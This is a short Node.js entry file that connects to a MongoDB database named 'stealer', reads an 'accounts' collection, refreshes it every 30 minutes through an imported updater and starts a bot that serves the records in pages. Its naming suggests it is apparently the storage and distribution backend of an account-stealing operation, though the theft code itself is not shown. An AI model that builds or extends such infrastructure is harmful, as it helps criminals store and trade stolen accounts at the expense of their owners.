const { db_administration } = require('./db/updater');
const { start_bot } = require('./bot/bot.js');
const MongoClient = require("mongodb").MongoClient;

const client = new MongoClient(
    process.env.STEALER_MONGO_LINK,
    { useUnifiedTopology: true },
);

const main = async () => {
    await client.connect();

    const page_size = 3;

    const db = client.db("stealer");
    let accounts = db.collection("accounts");

    db_administration(accounts) //first run
    setInterval(
        () => {
            db_administration(accounts);
        },
        1000 * 60 * 30 //30 min
    );
    start_bot(db, page_size);
}

main();